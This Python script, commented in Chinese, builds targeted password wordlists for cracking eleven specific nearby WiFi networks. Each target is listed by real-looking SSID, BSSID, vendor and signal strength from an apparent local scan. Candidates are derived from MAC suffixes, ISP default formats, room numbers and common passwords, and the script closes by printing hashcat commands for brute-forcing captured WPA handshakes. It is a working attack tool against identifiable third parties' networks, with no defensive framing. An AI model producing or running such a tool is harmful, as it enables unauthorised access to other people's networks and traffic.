#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
针对性WiFi密码本生成器
根据每个WiFi的SSID、BSSID、厂商信息，生成高命中率密码本
用于 hashcat GPU离线破解 或 在线快速爆破
"""

import os
import itertools

# ============================================================
# 输出目录
# ============================================================
OUT_DIR = os.path.dirname(os.path.abspath(__file__))

# ============================================================
# 目标WiFi列表（从扫描结果提取的高价值目标）
# ============================================================
TARGETS = [
    {
        "ssid": "CMCC-R5Ji",
        "bssid": "c0:e0:18:f9:41:18",
        "vendor": "HUAWEI",       # 华为（移动定制）
        "type": "移动宽带",
        "signal": -56,
    },
    {
        "ssid": "sxbctvnet-CE9730",
        "bssid": "00:26:ac:ce:97:30",
        "vendor": "陕西广电",
        "type": "广电宽带",
        "signal": -59,
    },
    {
        "ssid": "ChinaNet-aWKW",
        "bssid": "d4:fc:13:6c:52:9d",
        "vendor": "烽火(Fiberhome)",
        "type": "电信宽带",
        "signal": -59,
    },
    {
        "ssid": "dingding",
        "bssid": "34:f7:16:2a:db:3b",
        "vendor": "TP-LINK",
        "type": "个人WiFi",
        "signal": -62,
    },
    {
        "ssid": "CMCC-K6GQ",
        "bssid": "64:6e:60:10:89:ce",
        "vendor": "ZTE(中兴)",
        "type": "移动宽带",
        "signal": -73,
    },
    {
        "ssid": "404",
        "bssid": "02:1c:0a:bc:6e:1e",
        "vendor": "未知(随机MAC)",
        "type": "个人WiFi",
        "signal": -74,
    },
    {
        "ssid": "CMCC-qSvF",
        "bssid": "a4:1b:34:1c:60:08",
        "vendor": "中国移动",
        "type": "移动宽带",
        "signal": -78,
    },
    {
        "ssid": "601",
        "bssid": "b0:5d:16:78:d8:a0",
        "vendor": "未知",
        "type": "门牌号WiFi",
        "signal": -88,
    },
    {
        "ssid": "2403",
        "bssid": "94:ab:0a:6a:80:00",
        "vendor": "未知",
        "type": "门牌号WiFi",
        "signal": -88,
    },
    {
        "ssid": "TP-LINK_65E9",
        "bssid": "dc:fe:18:0d:65:e9",
        "vendor": "TP-LINK",
        "type": "出厂名路由器",
        "signal": -92,
    },
    {
        "ssid": "HUAWEI-10EPH0",
        "bssid": "b4:f1:8c:0e:7e:58",
        "vendor": "HUAWEI",
        "type": "出厂名路由器",
        "signal": -89,
    },
]


def mac_clean(bssid):
    """去掉冒号，返回小写12位hex"""
    return bssid.replace(":", "").replace("-", "").lower()


def gen_mac_passwords(bssid):
    """根据BSSID生成MAC相关密码"""
    mac = mac_clean(bssid)
    pwds = set()
    if len(mac) >= 12:
        # 完整12位MAC
        pwds.add(mac)
        pwds.add(mac.upper())
        # 后8位（很多路由器默认密码）
        pwds.add(mac[-8:])
        pwds.add(mac[-8:].upper())
        # 后6位补00/11
        pwds.add(mac[-6:] + "00")
        pwds.add(mac[-6:] + "11")
        pwds.add("00" + mac[-6:])
        pwds.add(mac[-6:].upper() + "00")
        # 后6位重复
        pwds.add(mac[-6:] + mac[-6:])
        # 倒序
        pwds.add(mac[-8:][::-1])
    return pwds


def gen_ssid_passwords(ssid):
    """根据SSID名称生成针对性密码"""
    pwds = set()
    lower = ssid.lower()

    # SSID本身（如果>=8位）
    if len(lower) >= 8:
        pwds.add(lower)
        pwds.add(ssid)

    # SSID + 常见后缀
    suffixes = [
        "123", "1234", "12345", "123456",
        "666", "888", "000", "111", "520",
        "0000", "1111", "6666", "8888",
        "wifi", "WiFi", "WIFI",
        "@123", "#123", "!123",
    ]
    for s in suffixes:
        combo = lower + s
        if 8 <= len(combo) <= 16:
            pwds.add(combo)
        combo2 = s + lower
        if 8 <= len(combo2) <= 16:
            pwds.add(combo2)

    # 提取SSID中的数字
    digits = "".join(c for c in ssid if c.isdigit())
    if len(digits) >= 3:
        # 数字重复补到8位
        d = digits
        while len(d) < 8:
            d += digits
        pwds.add(d[:8])
        if len(d) >= 9:
            pwds.add(d[:9])
        if len(d) >= 10:
            pwds.add(d[:10])
        # 数字+常见后缀
        for s in ["0000", "1234", "8888", "6666", "1111", "0123"]:
            c = digits + s
            if 8 <= len(c) <= 12:
                pwds.add(c)
            c2 = s + digits
            if 8 <= len(c2) <= 12:
                pwds.add(c2)

    # 提取SSID中的字母部分
    letters = "".join(c for c in ssid if c.isalpha()).lower()
    if len(letters) >= 4:
        for s in ["123", "1234", "12345", "666", "888", "520"]:
            c = letters + s
            if 8 <= len(c) <= 16:
                pwds.add(c)

    return pwds


def gen_room_number_passwords(room_num):
    """门牌号/房间号WiFi的密码生成"""
    pwds = set()
    d = room_num
    nd = len(d)
    need = 8 - nd  # 补到8位需要的位数

    # 门牌号重复补8位
    r = d
    while len(r) < 8:
        r += d
    pwds.add(r[:8])
    if len(r) >= 9:
        pwds.add(r[:9])

    # 门牌号 + N位数字后缀，补到8-10位
    # 例如 601 需要补5位(00000-99999)=10万种，完全可接受
    for total_len in [8, 9, 10]:
        suffix_len = total_len - nd
        if suffix_len <= 0:
            continue
        if suffix_len <= 5:
            # 穷举所有N位数字后缀
            for i in range(10 ** suffix_len):
                pwds.add(d + f"{i:0{suffix_len}d}")
        # 前缀模式（数字+门牌号）
        prefix_len = total_len - nd
        if prefix_len <= 4:
            for i in range(10 ** prefix_len):
                pwds.add(f"{i:0{prefix_len}d}" + d)

    # 门牌号+常见组合
    for s in ["0000", "1111", "1234", "5678", "6666", "8888", "9999",
              "0520", "1314", "2024", "2025", "2026", "00000",
              "11111", "12345", "88888", "66666"]:
        c = d + s
        if 8 <= len(c) <= 12:
            pwds.add(c)
        c2 = s + d
        if 8 <= len(c2) <= 12:
            pwds.add(c2)

    # 门牌号+门牌号+数字
    dd = d + d
    while len(dd) < 8:
        dd += d
    pwds.add(dd[:8])

    return pwds


def gen_isp_cmcc_passwords(ssid, bssid):
    """移动宽带(CMCC)针对性密码"""
    pwds = set()
    mac = mac_clean(bssid)

    # 移动宽带常见默认密码格式
    # 1) MAC后8位
    pwds.update(gen_mac_passwords(bssid))

    # 2) SSID后缀相关
    suffix = ssid.split("-")[-1] if "-" in ssid else ""
    if suffix:
        sl = suffix.lower()
        for s in ["0000", "1234", "8888", "1111"]:
            pwds.add(sl + s)
            pwds.add(s + sl)

    # 3) 移动装机工号格式：8位数字
    # 高频起始: 1开头、5开头、8开头
    for prefix in ["10", "11", "12", "13", "15", "18", "50", "55", "80", "88"]:
        for i in range(10000):
            pwds.add(f"{prefix}{i:06d}")
        # 太多了，只取高频部分
        break  # 只生成10开头的1万条

    return pwds


def gen_isp_chinanet_passwords(ssid, bssid):
    """电信宽带(ChinaNet)针对性密码"""
    pwds = set()

    # 电信宽带默认密码通常是8位随机数字
    # 无法穷举（1亿种），但可以用高频模式
    pwds.update(gen_mac_passwords(bssid))

    # SSID后缀
    suffix = ssid.split("-")[-1] if "-" in ssid else ""
    if suffix:
        sl = suffix.lower()
        su = suffix.upper()
        for s in ["0000", "1234", "8888"]:
            pwds.add(sl + s)
            pwds.add(su + s)

    return pwds


def gen_sxbctv_passwords(ssid, bssid):
    """陕西广电宽带针对性密码"""
    pwds = set()
    mac = mac_clean(bssid)

    pwds.update(gen_mac_passwords(bssid))

    # CE9730 是SSID中的后缀，可能与密码直接相关
    suffix = ssid.split("-")[-1] if "-" in ssid else ""
    if suffix:
        sl = suffix.lower()
        su = suffix.upper()
        pwds.add(sl)  # 可能不够8位，下面补
        # 后缀+补位
        for s in ["00", "11", "12", "88", "66"]:
            c = sl + s
            if len(c) >= 8:
                pwds.add(c)
            c = su + s
            if len(c) >= 8:
                pwds.add(c)
        # 纯数字提取
        digits = "".join(c for c in suffix if c.isdigit())
        if digits:
            d = digits
            while len(d) < 8:
                d += digits
            pwds.add(d[:8])
            pwds.add(d[:9])
            pwds.add(d[:10])
            # digits + 补位
            for s in ["0000", "1234", "8888", "00", "11"]:
                c = digits + s
                if 8 <= len(c) <= 12:
                    pwds.add(c)

    return pwds


def gen_tplink_passwords(ssid, bssid):
    """TP-LINK路由器针对性密码"""
    pwds = set()
    mac = mac_clean(bssid)

    pwds.update(gen_mac_passwords(bssid))

    # TP-LINK默认密码常见格式
    # 1) SSID后4位hex重复
    suffix = ssid.split("_")[-1] if "_" in ssid else ""
    if suffix:
        sl = suffix.lower()
        pwds.add(sl * 2 if len(sl * 2) >= 8 else sl + "0" * (8 - len(sl)))
        pwds.add("tp" + sl + "tp" if len("tp" + sl + "tp") >= 8 else "")
        pwds.add("admin" + sl)

    # 2) MAC后8位（最常见的TP-LINK默认）
    pwds.add(mac[-8:])
    pwds.add(mac[-8:].upper())

    # 3) 1234567890（TP-LINK经典默认）
    pwds.add("1234567890")
    pwds.add("12345678")

    return pwds


def gen_huawei_passwords(ssid, bssid):
    """华为路由器针对性密码"""
    pwds = set()
    mac = mac_clean(bssid)

    pwds.update(gen_mac_passwords(bssid))

    # 华为默认密码常见格式：8位随机数字或MAC后8位
    # SSID中的后缀
    suffix = ssid.split("-")[-1] if "-" in ssid else ""
    if suffix:
        sl = suffix.lower()
        su = suffix.upper()
        # 后缀相关
        for s in ["0000", "1234", "8888"]:
            c = sl + s
            if 8 <= len(c) <= 12:
                pwds.add(c)
            c2 = su + s
            if 8 <= len(c2) <= 12:
                pwds.add(c2)

    return pwds


def gen_dingding_passwords():
    """dingding WiFi专属密码"""
    pwds = set()

    # 拼音类密码
    bases = ["dingding", "DingDing", "DINGDING", "dd", "dingd"]
    for b in bases:
        for s in ["123", "1234", "12345", "123456",
                   "666", "888", "520", "000", "111",
                   "0000", "1111", "6666", "8888",
                   "2024", "2025", "2026",
                   "wifi", "@123", "#123"]:
            c = b + s
            if 8 <= len(c) <= 16:
                pwds.add(c)

    # 叮叮可能是人名：丁丁
    for b in ["dingding", "dd", "ding"]:
        # +生日格式
        for y in range(1980, 2006):
            for m in range(1, 13):
                for d in [1, 5, 10, 15, 20, 25, 28]:
                    bd = f"{y}{m:02d}{d:02d}"
                    c = b + bd[-4:]  # 取MMDD
                    if 8 <= len(c) <= 12:
                        pwds.add(c)

    # 纯数字常见密码
    pwds.add("dingding")

    return pwds


def gen_404_passwords():
    """404 WiFi专属密码"""
    pwds = set()

    # 404 + 数字组合
    for i in range(100000):
        p = f"404{i:05d}"
        pwds.add(p)
    for i in range(100000):
        p = f"{i:05d}404"
        pwds.add(p)

    # 404 + 常见后缀
    for s in ["404404", "40440440", "04040404",
              "notfound", "NotFound", "NOTFOUND",
              "error404", "Error404"]:
        if len(s) >= 8:
            pwds.add(s)

    # 404重复
    pwds.add("40440440")
    pwds.add("04040404")
    pwds.add("44044044")
    pwds.add("404404404")

    return pwds


def gen_common_top_passwords():
    """通用高频密码TOP（所有目标共享）"""
    return {
        # 纯数字TOP
        "12345678", "88888888", "00000000", "11111111", "66666666",
        "123456789", "1234567890", "0123456789", "87654321", "12341234",
        "11112222", "12121212", "99999999", "22222222", "33333333",
        "55555555", "77777777", "98765432", "11223344", "10203040",
        # 情感数字
        "52013141", "13145200", "52005200", "13141314", "52025202",
        "14725836", "15935728", "52052052", "13131313", "10101010",
        "16881688", "18881888", "68886888",
        # 年份
        "20242024", "20252025", "20262026", "20232023", "20222022",
        # 字母数字
        "password", "admin123", "admin888", "a1234567", "abc12345",
        "qwer1234", "asdf1234", "1q2w3e4r", "abcd1234", "wifi1234",
        # 键盘模式
        "qwertyui", "asdfghjk", "1qaz2wsx", "qweasdzx",
    }


def generate_for_target(target):
    """为单个目标生成完整密码本"""
    ssid = target["ssid"]
    bssid = target["bssid"]
    ttype = target["type"]

    pwds = set()

    # 通用TOP密码
    pwds.update(gen_common_top_passwords())

    # MAC相关密码
    pwds.update(gen_mac_passwords(bssid))

    # SSID相关密码
    pwds.update(gen_ssid_passwords(ssid))

    # 根据类型生成专属密码
    if "移动" in ttype or ssid.startswith("CMCC"):
        pwds.update(gen_isp_cmcc_passwords(ssid, bssid))
    elif "电信" in ttype or ssid.startswith("ChinaNet"):
        pwds.update(gen_isp_chinanet_passwords(ssid, bssid))
    elif "广电" in ttype or "sxbctv" in ssid:
        pwds.update(gen_sxbctv_passwords(ssid, bssid))
    elif ssid == "dingding":
        pwds.update(gen_dingding_passwords())
    elif ssid == "404":
        pwds.update(gen_404_passwords())
    elif ssid.startswith("TP-LINK"):
        pwds.update(gen_tplink_passwords(ssid, bssid))
    elif ssid.startswith("HUAWEI"):
        pwds.update(gen_huawei_passwords(ssid, bssid))

    # 门牌号WiFi
    digits_in_ssid = "".join(c for c in ssid if c.isdigit())
    if ttype == "门牌号WiFi" or (digits_in_ssid and len(digits_in_ssid) <= 5
                                 and len(digits_in_ssid) >= 2):
        pwds.update(gen_room_number_passwords(digits_in_ssid))

    # 过滤：WPA密码最少8位，最多63位
    valid = sorted(p for p in pwds if 8 <= len(p) <= 63 and p.strip())

    return valid


def main():
    print("=" * 60)
    print("  针对性WiFi密码本生成器")
    print("=" * 60)

    all_passwords = set()

    for t in TARGETS:
        pwds = generate_for_target(t)
        all_passwords.update(pwds)

        # 单独保存每个目标的密码本
        fname = f"dict_{t['ssid'].replace('/', '_').replace(' ', '_')}.txt"
        fpath = os.path.join(OUT_DIR, fname)
        with open(fpath, "w", encoding="utf-8") as f:
            f.write("\n".join(pwds) + "\n")

        print(f"  {t['ssid']:20s} ({t['type']:8s}) "
              f"→ {len(pwds):>7,}条  信号:{t['signal']}dBm  [{fname}]")

    # 合并所有目标的密码本（去重）
    all_sorted = sorted(all_passwords)
    merged_path = os.path.join(OUT_DIR, "dict_ALL_TARGETS.txt")
    with open(merged_path, "w", encoding="utf-8") as f:
        f.write("\n".join(all_sorted) + "\n")

    print(f"\n  {'合并密码本':20s}          → {len(all_sorted):>7,}条  [dict_ALL_TARGETS.txt]")
    print(f"\n  输出目录: {OUT_DIR}")

    # 提示hashcat用法
    print("\n" + "=" * 60)
    print("  hashcat GPU破解命令（捕获到握手包后使用）:")
    print("=" * 60)
    print(f"  # 字典攻击（用合并密码本）:")
    print(f"  hashcat -m 22000 handshake.22000 {merged_path}")
    print(f"\n  # 字典攻击（用单个目标密码本）:")
    print(f"  hashcat -m 22000 handshake.22000 dict_CMCC-R5Ji.txt")
    print(f"\n  # 8位纯数字穷举（32分钟@M1）:")
    print(f"  hashcat -m 22000 -a 3 handshake.22000 '?d?d?d?d?d?d?d?d'")
    print(f"\n  # 字典+规则变换（×64倍扩展）:")
    print(f"  hashcat -m 22000 -a 0 handshake.22000 {merged_path} -r best64.rule")


if __name__ == "__main__":
    main()
